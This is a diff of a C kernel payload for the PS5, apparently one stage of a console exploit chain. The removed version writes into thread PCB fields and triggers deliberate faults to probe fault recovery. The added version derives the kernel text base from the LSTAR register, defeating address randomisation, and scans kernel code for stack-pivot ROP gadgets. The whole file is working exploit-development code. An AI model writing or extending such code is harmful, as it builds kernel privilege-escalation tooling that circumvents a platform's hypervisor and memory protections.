@@ -1,65 +1,62 @@
 #include <stdint.h>
 
 /*
- * smart_pivot_scan v19 — pcb_onfault multi-offset probe
+ * smart_pivot_scan v20 — Direct ktext gadget scanner
  *
- * v18 crashed: NULL read with onfault at +0xb0 caused kernel panic.
- * Possible causes:
- *   A) Hypervisor intercepts NULL faults before FreeBSD trap()
- *   B) pcb_onfault offset is not +0xb0 on PS5
+ * v18/v19 confirmed: PS5 hypervisor blocks pcb_onfault recovery from
+ * arbitrary code. But ktext IS mapped and readable from kernel mode.
+ * No need for onfault — just scan ktext bytes directly.
  *
- * v19 strategy:
- *   Phase 1: Try onfault at +0xb0 with non-NULL fault address
- *            (0xdead000000001000 — avoids hypervisor NULL guard)
- *   If phase 1 crashes, phase 2 won't run (next iteration).
+ * Scans first 4MB of ktext for stack pivot gadget patterns:
+ *   Type 1: xchg rsp, rax          (48 94)
+ *   Type 2: xchg rsp, rcx..rdi     (48 87 e1..e7)
+ *   Type 3: xchg rsp, r8..r15      (49 87 e0..e7)
+ *   Type 4: pop rsp                (5c)
+ *   Type 5: leave; ret             (c9 c3)
+ *   Type 6: mov rsp, rbp; ... ret  (48 89 ec ... c3)
+ *   Type 7: mov rsp, [reg+disp]    (48 8b 24 ...)
  *
- *   Actually, we try MULTIPLE offsets in sequence, one at a time.
- *   Each attempt: write recovery addr to pcb+offset, trigger fault,
- *   if recovery fires → found it. If not, clear and try next offset.
- *
- *   But we can't "try and fail" - a failed onfault = panic.
- *   So instead: write recovery addr to ALL likely offsets at once.
- *   Since the whole region from +0x40 to +0xf8 is zero (fresh thread),
- *   writing to safe offsets simultaneously is OK.
- *
- *   Safe offsets (not loaded by context switch on running thread):
- *     +0x78..+0xa0 = debug registers (not auto-loaded)
- *     +0xa8 = initial_fpucw (16-bit, we'll overwrite but it's a fresh thread)
- *     +0xb0 = pcb_onfault (FreeBSD 11 standard)
- *     +0xb8..+0x100 = pcb_flags, pcb_save area pointers, etc.
- *
- *   We'll write to offsets +0xa8, +0xb0, +0xb8, +0xc0, +0xc8, +0xd0
- *   Then trigger fault with non-NULL address.
- *   After recovery, check which offset was the real onfault.
+ * For each pattern, check if ret (c3) follows within 8 bytes.
  *
  * Output layout:
  *   [0x00] magic|status
  *   [0x08] kdata_base
  *   [0x10] ktext_base
- *   [0x18] curthread
- *   [0x20] pcb_ptr
- *   [0x28] onfault_test_result (1=worked)
- *   [0x30] recovery_label_addr
- *   [0x38] winning_onfault_offset
- *   [0x40] fault_address_used
- *   [0x48] sentinel
+ *   [0x18] scan_range (bytes scanned)
+ *   [0x20] total_gadgets_found
+ *   [0x28..] gadget entries: each is 2 uint64s:
+ *       [+0] offset_from_ktext | (type << 56)
+ *       [+1] first 8 bytes at that offset (raw instruction bytes)
+ *   ... up to 128 gadgets (256 slots)
+ *   [last] sentinel 0xdeadbeefcafe0020
  */
 
 #define MAGIC_SPVT     0x53505654
-#define TD_PCB_OFF     0x3f8
+#define MAX_GADGETS    128
+#define SCAN_SIZE      0x400000  /* 4MB */
 
 typedef struct {
     uint64_t kdata_base;
     uint32_t fw_ver;
 } kproc_args;
 
+/* Check if there's a ret (0xc3) within 'window' bytes after position */
+static int has_ret_nearby(const uint8_t* code, uint64_t pos, uint64_t max, int window)
+{
+    for (int i = 0; i < window && (pos + i) < max; i++) {
+        if (code[pos + i] == 0xc3)
+            return i;  /* distance to ret */
+    }
+    return -1;
+}
+
 int module_start(kproc_args* args)
 {
     uint64_t kdata_base = args->kdata_base;
     volatile uint64_t* out = (volatile uint64_t*)args;
 
-    /* Zero output area */
-    for (int i = 0; i < 14; i++)
+    /* Zero output (use available space: 2304 bytes = 288 slots) */
+    for (int i = 0; i < 280; i++)
         out[i] = 0;
 
     out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
@@ -68,127 +65,89 @@ int module_start(kproc_args* args)
     uint32_t lo, hi;
     __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"((uint32_t)0xC0000082));
     uint64_t lstar = ((uint64_t)hi << 32) | lo;
+    uint64_t ktext_base = lstar - 0x294218;
 
     out[1] = kdata_base;
-    out[2] = lstar - 0x294218;
+    out[2] = ktext_base;
+    out[3] = SCAN_SIZE;
 
-    /* Read curthread */
-    uint64_t curthread;
-    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
-    out[3] = curthread;
+    const uint8_t* ktext = (const uint8_t*)ktext_base;
+    int found = 0;
 
-    /* Read td_pcb */
-    uint64_t pcb_ptr = *(volatile uint64_t*)(curthread + TD_PCB_OFF);
-    out[4] = pcb_ptr;
+    for (uint64_t i = 0; i < SCAN_SIZE - 8 && found < MAX_GADGETS; i++) {
+        uint8_t b0 = ktext[i];
+        uint8_t b1 = ktext[i + 1];
+        uint8_t b2 = ktext[i + 2];
+        int type = 0;
+        int gadget_len = 0;
 
-    /* Non-NULL fault address (avoids potential hypervisor NULL guard) */
-    uint64_t fault_addr = 0xdead000000001000ULL;
-    out[8] = fault_addr;
-
-    /*
-     * Write recovery address to multiple candidate onfault offsets.
-     * PCB region +0x40..+0xf8 is all zeros (confirmed by v17 dump).
-     *
-     * We try offsets: +0xa8, +0xb0, +0xb8, +0xc0, +0xc8, +0xd0
-     * After recovery, we probe which offset was consumed/cleared by
-     * the fault handler (the kernel clears onfault after use, or we
-     * can check which ones still have our value).
-     *
-     * UNSAFE to write: +0x40(fsbase), +0x48(gsbase), +0x50(kgsbase),
-     *   +0x68(cr3) — these get loaded on context switch
-     */
-    __asm__ volatile(
-        /* Get recovery label address */
-        "lea 1f(%%rip), %%r9\n"
-
-        /* Store recovery_label to out[6] */
-        "movq %%r9, (%[out6])\n"
-
-        /* Write recovery addr to candidate offsets */
-        "movq %%r9, 0xa8(%[pcb])\n"
-        "movq %%r9, 0xb0(%[pcb])\n"
-        "movq %%r9, 0xb8(%[pcb])\n"
-        "movq %%r9, 0xc0(%[pcb])\n"
-        "movq %%r9, 0xc8(%[pcb])\n"
-        "movq %%r9, 0xd0(%[pcb])\n"
-
-        /* Trigger fault: read from non-NULL unmapped address */
-        "movq %[faddr], %%rax\n"
-        "movq (%%rax), %%rax\n"
-
-        /* If we get here, fault didn't trigger onfault */
-        "movq $0, (%[result])\n"
-        "jmp 2f\n"
-
-        /* Recovery point */
-        "1:\n"
-        /* We landed here via onfault! */
-        "movq $1, (%[result])\n"
-
-        "2:\n"
-        :
-        : [pcb] "r"(pcb_ptr),
-          [result] "r"(&out[5]),
-          [out6] "r"(&out[6]),
-          [faddr] "r"(fault_addr)
-        : "rax", "r9", "memory"
-    );
-
-    if (out[5] == 1) {
-        /* Recovery worked! Now find which offset was the real onfault.
-         * The kernel fault handler reads pcb_onfault and jumps to it.
-         * It might or might not clear the field. Check which offsets
-         * still have our recovery addr vs which were cleared.
-         *
-         * Re-read pcb pointer safely */
-        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
-        pcb_ptr = *(volatile uint64_t*)(curthread + TD_PCB_OFF);
-        volatile uint64_t* pcb = (volatile uint64_t*)pcb_ptr;
-
-        uint64_t recovery_addr = out[6];
-        uint64_t winning_offset = 0;
-
-        /* Check each offset - the real onfault may have been cleared
-         * by the trap handler, or it may still contain our value.
-         * We need to check and clean up all of them. */
-        int offsets[] = {0xa8, 0xb0, 0xb8, 0xc0, 0xc8, 0xd0};
-        for (int i = 0; i < 6; i++) {
-            volatile uint64_t* slot = (volatile uint64_t*)((uint8_t*)pcb + offsets[i]);
-            uint64_t val = *slot;
-            *slot = 0;  /* Clean up */
-
-            /* The real onfault was used by the fault handler.
-             * In FreeBSD, trap_pfault does NOT clear pcb_onfault,
-             * it just sets tf_rip = pcb_onfault. So all offsets
-             * should still have our value. But the REAL onfault is
-             * the one the handler actually read. We can't distinguish
-             * this way. Instead, we'll do a second test: write to
-             * only one offset at a time and see if it works. */
+        /* Type 1: xchg rsp, rax = 48 94 */
+        if (b0 == 0x48 && b1 == 0x94) {
+            type = 1;
+            gadget_len = 2;
+        }
+        /* Type 2: xchg rsp, rcx..rdi = 48 87 e1..e7 (skip e4=rsp) */
+        else if (b0 == 0x48 && b1 == 0x87 && b2 >= 0xe1 && b2 <= 0xe7 && b2 != 0xe4) {
+            type = 2;
+            gadget_len = 3;
+        }
+        /* Type 3: xchg rsp, r8..r15 = 49 87 e0..e7 */
+        else if (b0 == 0x49 && b1 == 0x87 && b2 >= 0xe0 && b2 <= 0xe7) {
+            type = 3;
+            gadget_len = 3;
+        }
+        /* Type 4: pop rsp = 5c */
+        else if (b0 == 0x5c) {
+            /* Need ret nearby */
+            int ret_dist = has_ret_nearby(ktext, i + 1, SCAN_SIZE, 8);
+            if (ret_dist >= 0 && ret_dist <= 6) {
+                type = 4;
+                gadget_len = 1;
+            }
+        }
+        /* Type 5: leave; ret = c9 c3 */
+        else if (b0 == 0xc9 && b1 == 0xc3) {
+            type = 5;
+            gadget_len = 2;
+        }
+        /* Type 6: mov rsp, rbp = 48 89 ec (followed by ret within 8) */
+        else if (b0 == 0x48 && b1 == 0x89 && b2 == 0xec) {
+            int ret_dist = has_ret_nearby(ktext, i + 3, SCAN_SIZE, 8);
+            if (ret_dist >= 0) {
+                type = 6;
+                gadget_len = 3;
+            }
+        }
+        /* Type 7: mov rsp, rXX = 48 89 [c4,cc,d4,dc,f4,fc] */
+        else if (b0 == 0x48 && b1 == 0x89 &&
+                 (b2 == 0xc4 || b2 == 0xcc || b2 == 0xd4 ||
+                  b2 == 0xdc || b2 == 0xf4 || b2 == 0xfc)) {
+            int ret_dist = has_ret_nearby(ktext, i + 3, SCAN_SIZE, 6);
+            if (ret_dist >= 0) {
+                type = 7;
+                gadget_len = 3;
+            }
         }
 
-        /* For now, just report success and that multi-offset worked */
-        out[7] = 0xFFFF;  /* placeholder - need single-offset test */
-    }
-
-    /* Clean up: zero all candidate offsets */
-    {
-        __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
-        pcb_ptr = *(volatile uint64_t*)(curthread + TD_PCB_OFF);
-        volatile uint64_t* pcb_bytes = (volatile uint64_t*)pcb_ptr;
-        /* Clear +0xa8 through +0xd0 */
-        for (int off = 0xa8; off <= 0xd0; off += 8) {
-            *(volatile uint64_t*)((uint8_t*)pcb_bytes + off) = 0;
+        if (type > 0) {
+            /* Store gadget: offset | (type << 56) */
+            int slot = 5 + found * 2;
+            out[slot] = i | ((uint64_t)type << 56);
+            /* Store raw bytes at this offset */
+            out[slot + 1] = *(const uint64_t*)(ktext + i);
+            found++;
         }
     }
 
-    /* Sentinel */
-    out[9] = 0xdeadbeefcafe0019ULL;
+    out[4] = found;
 
-    /* Signal done */
-    if (out[5] == 1)
-        out[0] = ((uint64_t)0x0002 << 32) | MAGIC_SPVT;  /* onfault worked! */
-    else
-        out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;  /* no onfault */
+    /* Sentinel after last gadget */
+    int sentinel_slot = 5 + found * 2;
+    if (sentinel_slot < 278)
+        out[sentinel_slot] = 0xdeadbeefcafe0020ULL;
+
+    /* Done */
+    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
 
     return 0;
 }
